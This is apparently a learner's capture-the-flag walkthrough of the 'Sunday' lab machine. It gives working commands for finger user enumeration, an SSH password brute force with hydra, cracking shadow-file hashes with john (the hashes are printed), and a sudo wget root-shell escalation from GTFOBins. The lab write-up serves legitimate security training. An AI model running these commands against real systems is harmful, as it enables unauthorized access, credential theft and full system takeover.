# Connect to the machine 

use openvpn or another vpn to connect to the machine as follows 

```shell
openvpn lab_acountname.ovpn
```

after that try to ping the machine to make sure you are connected 


```shell
ping 10.10.10.76
```

if you get response then we are ready to enumerate


# Recon

 using Nmap with default scripts with default scripts and with services versions

```shell
nmap -sV -sC 10.10.10.76
```


which results to 

```shell

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 03:02 EDT
Nmap scan report for sunday.htb (10.10.10.76)
Host is up (0.065s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
79/tcp  open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp open  rpcbind 2-4 (RPC #100000)
515/tcp open  printer
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94%I=7%D=8/19%Time=64E06934%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest<i cutted the rest here >

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.87 seconds
```


to summery this result we have 4 ports open :

1. 79 finger
2. 111 rpcbind
3. 515 printer

# Enumeration

As I am not familiar with these Services i will search the internet for exploitation for each and started with finger :

## finger 

i found this [link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger) usefull as it explains what the service is used for and how to enumerate it , but it looks like we will get some usernames from this service.

trying to Enumerate it with 
```shell
echo "root" | nc -vn 10.10.10.76 79

->
(UNKNOWN) [10.10.10.76] 79 (finger) open
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Oct 14, 2022>
```

it looks like the service works and the root user exists.


using this [script](https://pentestmonkey.net/tools/user-enumeration/finger-user-enum) to brute force the service for available users 

```shell
perl finger-user-enum.pl -U  /usr/share/wordlists/rockyou.txt -t 10.10.10.76

```

i got alot of answers as numbers and names and not user names, but i noticed just two users **sunny,sammy** have a when and where value , so i feel that they are the intended users from this service.

i couldnt find usefull information about attacking the other two services so i decided to go back to **recon** and this time using the nmap flag **-p-** which returned more nonstandard port

and found ssh on 22022 

so i ll use this to try to login in to the account sunny and then sammy

## bruteforcing


i tried brute-forcing the ssh service using hydra as follows (i tried different word list till this one worked for me), note that ssh is slow and yo cant use a huge wordlist :

```shell
hydra -l sunny -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt ssh://10.10.10.76:22022
```

which gaved me the passwrd **sunday**

## ssh

```shell
ssh sunny@10.10.10.76 -p 22022
```

and we got an initial foothold :)

finding the user.txt file 
```shell

find /home -name "user.txt"

->
/home/sammy/user.txt
```

and you can get the flag with the cat command

```shell
cat /home/sammy/user.txt 
```

## Privilege Escalation

using sudo -l we can see our sudo privileges 

```shell
sudo -l

->
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll

```

running the script as sudo 
```shell
sudo /root/troll
testing
uid=0(root) gid=0(root)
```

nothing usefull and we dont have permission over the file as it is in the root directory.

looking at the history file with the command `history` showed an interesting file for backup **/backup/shadow.backup**

```shell

mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

```

it looks like a backup for the /etc/shadow file , we can see from the \$5\$  that it is SHA-256 and we can try bruteforcing it using john the ripper 

```shell 
john shadow --wordlist=/usr/share/wordlists/rockyou.txt 

->
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (sammy)     
1g 0:00:00:38 DONE (2023-08-19 04:25) 0.02631g/s 5376p/s 5376c/s 5376C/s domonique1..canpanita
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
(shadow is a copy of the backup file i copied to my attack host )


now we have the host sammy, lets log as sammy using 
```shell
su sammy
```

then running 

```shell
sudo -l

->
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget

```

we can execute wget as root 

going to the site https://gtfobins.github.io/ and searching for wget,
we see that we can get a root shell using the following commands 

```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

and we landed in a root shell :)

and we can read the root flag in 
/root/root.txt